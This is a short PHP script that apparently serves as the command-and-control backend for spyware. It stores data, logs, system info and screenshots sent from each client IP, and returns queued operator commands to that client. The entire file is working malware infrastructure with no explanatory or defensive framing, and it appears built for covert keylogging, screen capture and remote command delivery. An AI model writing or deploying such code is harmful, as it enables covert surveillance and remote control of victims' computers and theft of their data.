<?php

$ip = $_SERVER['REMOTE_ADDR'];

$file_data = 'data/' . $ip;
$file_log  = 'log/' . $ip;
$file_cmds = 'commands/' . $ip;
$file_info = 'info/' . $ip;

if (isset($_POST['d'])) {
	file_put_contents($file_data, file_get_contents($file_data) . $_POST['d']);

	echo file_get_contents($file_cmds);
	file_put_contents($file_cmds, '');
}
if (isset($_POST['l'])) {
	file_put_contents($file_log,
		file_get_contents($file_log)
		. "[" . date("F d Y H:i:s", time())
		. "] " . $_POST['l'] . "\n");
}
if (isset($_POST['i'])) {
	file_put_contents($file_info, $_POST['i']);
}
else if (isset($_FILES['s'])) {
	$uploaddir = 'screenshots/';
	$uploadfile = $uploaddir . $ip . '-' . time();
	move_uploaded_file($_FILES['s']['tmp_name'], $uploadfile);
}

?>